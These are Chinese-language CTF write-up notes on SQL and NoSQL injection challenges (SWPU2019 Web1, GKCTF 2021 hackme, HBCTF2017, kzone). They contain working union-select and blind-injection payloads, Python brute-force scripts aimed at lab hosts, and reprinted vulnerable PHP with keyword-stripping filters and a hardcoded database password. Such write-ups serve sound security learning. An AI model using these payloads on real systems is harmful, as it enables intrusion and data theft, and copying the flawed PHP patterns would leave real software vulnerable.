
## 二次注入

## 无列名注入

[CTF|mysql之无列名注入](https://zhuanlan.zhihu.com/p/98206699)

原理将不知道名字的列取别名

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled.png)

### [SWPU2019]Web1

打开是个登录界面，注册一个账号来看看功能，发现可以发布广告，广告发布后可以查看详情

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%201.png)

url中有个id的参数感觉是sql注入，然而id并不是注入点，返回了400

在申请的那里order by 的时候发现有过滤，感觉应该在这里注入

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%202.png)

点开访问的时候发现

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%203.png)

应该是二次注入

- 查库 'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%204.png)

- 查表 'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%205.png)

- 查列名 'union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/FLAG_TABLE),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%206.png)

- 无列名注入 'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%207.png)

## nosql

### [GKCTF 2021]hackme

nosql注入，对$eq和$ne应该有检测

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%208.png)

Unicode编码绕过

显示登录失败，用户名就是admin可以盲注密码

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%209.png)

用$regex来匹配

```python
import string
import requests

characters = string.ascii_letters + string.digits  # [A-Za-z0-9]
password = ""
payload = """{"username":{"$\\u0065\\u0071": "admin"}, "password": {"$\\u0072\\u0065\\u0067\\u0065\\u0078": "^%s"}}"""
url = "http://node4.buuoj.cn:26351/login.php"

for i in range(50):
    for character in characters:
        response = requests.post(url=url, data=(payload % (password + character)),
                                 headers={"Content-Type": "application/json; charset=UTF-8"})
        responseContent = response.content.decode()
        
        #print(f"[+] Trying {character} with response {responseContent}")
        response.close()
        if "登录了" in responseContent:
            password += character
            print(f"[*] Found new character {character} with password now which is {password}")
            break
```

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2010.png)

登录后有一个文件读取

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2011.png)

根据题目提示去查看了配置文件/usr/local/nginx/conf/nginx.conf发现了有weblogic

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2012.png)

nginx服务器版本小于1.17.7

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2013.png)

可以使用请求走私漏洞，burp发包并不理想

## 双写绕过

### [HBCTF2017]大美西安

F12是web手的基本素质，注册被藏起来了

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2014.png)

三个功能点，在download这里的查看存在参数为感觉有sql

查询逻辑可能是select picture from xxx where id = 

毫无影响，可能是有过滤

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2015.png)

-1 union select 这显示无这个picture

在download这里进行双写绕过

1 ununionion selselectect 0x636f6e6669672e706870

```php
<?php 
#define("DIR_PERMITION",time());
include("config.php");
$_POST = d_addslashes($_POST);
$_GET = d_addslashes($_GET);

?>

<html>
<head>
<title>大美西安</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

</head>
<body>

<?php

$file  = isset($_GET['file'])?$_GET['file']:"home";
// echo $file;

if(preg_match('/\.\.|^[\s]*\/|^[\s]*php:|filter/i',$file)){
	   echo "<div class=\"msg error\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
		die();
}

$filename = $file.".php";

if(!include($filename)){
    
	if(!isset($_SESSION['username'])||!isset($_SESSION['userid'])){
	  header("Location: index.php?file=login");
	  die();
    }

    echo '<link rel="stylesheet" href="./css/main.css" style="css" />';
	
	echo '<div id="left"><div class="main"><table align=center  cellspacing="0" cellpadding="0" style="border-collapse: collapse;border:0px;">
	<tr>
	<form method=get action="index.php">
	<td align=right style="padding:0px; border:0px; margin:0px;">
			<input type=submit name=file value="home" class="side-pan">
	</td>
	<td  align=right style="padding:0px; border:0px; margin:0px;" >
			<input type=submit name=file value="download" class="side-pan">
	</td>
	<td  align=right style="padding:0px; border:0px; margin:0px;" >
			<input type=submit name=file value="upload" class="side-pan">
	</td>
	</form></tr></table></div></div>
	<div id="right"></div><div align=center>';
	
	echo '<br><br><font size=5>西安 --- 神奇的旅游胜地，十三朝古都。
	一块古老的土地，历史老人曾镌刻了无数的辉煌； 一座年轻的城市，时代之神正编织着美丽的梦想。
	西安，古称长安，是当年意大利探险家马可·波罗笔下《马可·波罗游记》中著名的古丝绸之路的起点。罗马哲人奥古斯都说过“一座城市的历史就是一个民族的历史”。
	西安，这座永恒的城市，就像一部活的史书，一幕幕，一页页记录着中华民族的沧桑巨变。';
	
}
    
?>

</body>
</html>
```

```php
<?php 

error_reporting(0);
session_start();

$dbhost = "127.0.0.1";
$dbuser = "admin";
$dbpass = "password987~!@";
$dbname = "dsqli";

$conn = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
$conn ->query("set names utf8"); 

function d_addslashes($array){

    foreach($array as $key=>$value){
        if(!is_array($value)){
              !get_magic_quotes_gpc()&&$value=addslashes($value);
              $array[$key]=$value;
        }else{
          $array[$key] = d_addslashes($array[$key]);
        }
    }
    return $array;
}

function filter($id){
    $id = strtolower($id);
    
	$id = str_replace('select', '', $id);
	$id = str_replace('update', '', $id);
	$id = str_replace('insert', '', $id);
	$id = str_replace('delete', '', $id);
	$id = str_replace('and', '', $id);
	$id = str_replace('or', '', $id);
	$id = str_replace('where', '', $id);
	$id = str_replace('union', '', $id);
    $id = str_replace('like', '', $id);
    $id = str_replace('regexp', '', $id);
    $id = str_replace('is', '', $id);
	$id = str_replace('=', '', $id);
	$id = str_replace(',', '', $id);
	$id = str_replace('|', '', $id);
	$id = str_replace('&', '', $id);
	$id = str_replace('!', '', $id);
    $id = str_replace('%', '', $id);
	$id = str_replace('^', '', $id);
	$id = str_replace('<', '', $id);
	$id = str_replace('>', '', $id);
	$id = str_replace('*', '', $id);
	$id = str_replace('(', '', $id);
	$id = str_replace(')', '', $id);
    return $id ;
}

function random_str($length = "32")
{
    $set = array("a", "b", "c",  "d", "e", "f", 
        "g", "h", "i", "j", "k", "l",
        "m","n", "o", "p", "q", "r","s","t","u","v", "w","x",
        "y","z","1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';
    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }
    return $str;
}
```

download.php

```php
<?php 
#defined("DIR_PERMITION") or die("Access denied!");
 if(!isset($_SESSION['username'])||!isset($_SESSION['userid'])){
	  header("Location: index.php?file=login");
	  die();
 }

?>

<link rel="stylesheet" href="./css/main.css" style="css" />
<div id="left"><div class="main"><table align=center  cellspacing="0" cellpadding="0" style="border-collapse: collapse;border:0px;">
	<tr>
	<form method=get action="index.php">
	      <td align=right style="padding:0px; border:0px; margin:0px;">
			<input type=submit name=file value="home" class="side-pan">
          </td>
          <td  align=right style="padding:0px; border:0px; margin:0px;" >
			 <input type=submit name=file value="download" class="side-pan">
	     </td>
	     <td  align=right style="padding:0px; border:0px; margin:0px;" >
			<input type=submit name=file value="upload" class="side-pan">
	    </td>
	</form></tr></table></div></div>
<div id="right"></div><div align=center>

<?php 

echo '
   <table width="40%" cellspacing="0" cellpadding="0" class="tb1" style="opacity: 0.6;">
   <tr><td width="20%" align=center style="padding: 10px;" >ID</td><td width="30%" align=center style="padding: 10px;">景点</td><td width="30%" align=center style="padding: 10px;">浏览</td><td width="30%" align=center style="padding: 10px;">收藏</td></tr></table>
   <table width="40%" cellspacing="0" cellpadding="0" class="tb1" style="margin:10px 2px 10px;opacity: 0.6;" >
  ';

$userid = $_SESSION['userid'];
$run="select * from download where uid='$userid' or uid='0'";
$result = mysqli_query($conn, $run);
    if (mysqli_num_rows($result) > 0) 
    {		
        while($row = mysqli_fetch_assoc($result)) 
            {
                
                echo '<tr><td width="20%" align=center style="padding: 10px;" >'.$row['id'].'</td>
                            <td width="40%" align=center style="padding: 10px;">'.htmlspecialchars($row['image_name'],ENT_QUOTES).'</td>
                            <td width="40%" align=center style="padding: 10px;"><a href="index.php?file=view&id='.$row['id'].'" target="">查看</a></td>
                            <td width="30%" align=center style="padding: 10px;">
                            <form method=post action="downfile.php" STYLE="margin: 0px; padding: 0px;">
                            <input type=hidden name=image value="'.$row['id'].'">
                            <input  type=submit class=download name=image_download value="收藏">
                            </form>
                        </td>
                    </tr>';
            }
    }
    echo '</table>';
```

upload.php

```php
<?php 

#defined("DIR_PERMITION") or die("Access denied!");

if(!isset($_SESSION['username'])||!isset($_SESSION['userid'])){
	  header("Location: index.php?file=login");
	  die();
 }

?>
<link rel="stylesheet" href="./css/main.css" style="css" />
<div id="left"><div class="main"><table align=center  cellspacing="0" cellpadding="0" style="border-collapse: collapse;border:0px;">
	<tr>
	<form method=get action="index.php">
	      <td align=right style="padding:0px; border:0px; margin:0px;">
			<input type=submit name=file value="home" class="side-pan">
          </td>
          <td  align=right style="padding:0px; border:0px; margin:0px;" >
			 <input type=submit name=file value="download" class="side-pan">
	     </td>
	     <td  align=right style="padding:0px; border:0px; margin:0px;" >
			<input type=submit name=file value="upload" class="side-pan">
	    </td>
	</form></tr></table></div></div>
<div id="right"></div><div align=center>

<form action="index.php?file=upload" method="post" enctype="multipart/form-data">
    <input type="file" name ="file">
    <input type="submit" name="submit" value="upload" >
</form>

<?php

if (isset($_FILES['file'])) {
    
    $seed = rand(0,getrandmax());
    mt_srand($seed);
    if ($_FILES["file"]["error"] > 0) {
        echo "<div class=\"msg error\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\">uplpad file error!:".$_FILES["file"]["error"]."</i></div>";
		die();
    }
    $fileTypeCheck = ((($_FILES["file"]["type"] == "image/gif")
            || ($_FILES["file"]["type"] == "image/jpeg")
            || ($_FILES["file"]["type"] == "image/pjpeg")
            || ($_FILES["file"]["type"] == "image/png"))
        && ($_FILES["file"]["size"] < 204800));
    $reg='/^gif|jpg|jpeg|png$/';
    $fileExtensionCheck=!preg_match($reg,pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
    
    if($fileExtensionCheck){
        die("Only upload image file!");
    }
    if($fileTypeCheck){
        
        $fileOldName = addslashes(pathinfo($_FILES['file']['name'],PATHINFO_FILENAME));
        $fileNewName = './Up10aDs/' . random_str() .'.'.pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
        $userid = $_SESSION['userid'];
        $sql= "insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')";
        $res = $conn ->query($sql);
        if($res&&move_uploaded_file($_FILES['file']['tmp_name'], $fileNewName)){
         echo "<script>alert('file upload success!');window.location.href='index.php?file=home'</script>";

        }else{
             echo "<script>alert('file upload error')</script>";
        }

    }else{

        echo "<script>alert('file  type error');</script>";
    }

}

?>
```

伪协议只ban了php伪协议可以phar

```python
import requests
import libnum
from time import sleep

url = "http://55c6b070-3b04-4ef1-a3e0-4c60aade7d09.node4.buuoj.cn:81/downfile.php"
paramsPost = {"image":"","image_download":"\x6536\x85cf"}
payload = "-1 uniunionon seselectlect location from download whwhereere location regregexpexp 0x557031306144732f{}"
cookies = {"_ga_P7C4RLLHKT":"GS1.1.1664796950.2.0.1664796950.0.0.0","_ga":"GA1.1.1509509376.1664764551","PHPSESSID":"h842i963spa3823nlebpufuir4"}
strs = "abcdefghijklmnopqrstuvwxyz0123456789"

flag = ''
while True:'''
    for str in strs:
        location = hex(ord(str))[2:]
        paramsPost["image"] = payload.format(flag+location)
        r = requests.post(url, data=paramsPost,  cookies=cookies)
        if "picture can't be find!" in r.text:
            continue
        if r.status_code != 200:
            sleep(1)
            r = requests.post(url, data=paramsPost, headers=cookies)
        else:
            flag += location
            print(libnum.n2s(int(flag,16)))
            break
```

一句话木马打包执行效果不理想，我选择了将命令上传慢慢执行

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2016.png)

最后拿下，值得注意的是由于sql语句的比较方法需要传入包的随机名称小于之前上传的包才能在脚本中爆破出文件名

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2017.png)

### kzone

www.zip拿源码

注入点再cooike里的admin_user

![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2018.png)

exp.py

```python
import requests
url='http://665c87ef-b542-431c-b294-088c5cc2b568.node4.buuoj.cn:81/include/common.php'
def unicode(s):
    Char=''
    for i in s:
        Char+=r'\u00'+hex(ord(i))[2:]
    return Char
text=''
dic = list('1234567890abcdefghijklmnopqrstuvwxyz[]<>@!-~?=_()*{}#. /')
for i in range(1,100):
    for s in dic:
        s=ord(s)
        payload=unicode("'||(ascii(substr((select group_concat(f44ag) from fl2222g),"+str(i)+",1))="+str(s)+")and'1")
        cookie={"islogin":"1","login_data":"{\"admin_user\":\""+payload+"\"}"}
        re=requests.get(url=url,cookies=cookie)
        if 'Set-Cookie' in re.headers:
            if re.headers['Set-Cookie'].count('expire') == 2:
                text += chr(s)
                print(text)
                break
        else:
            continue
```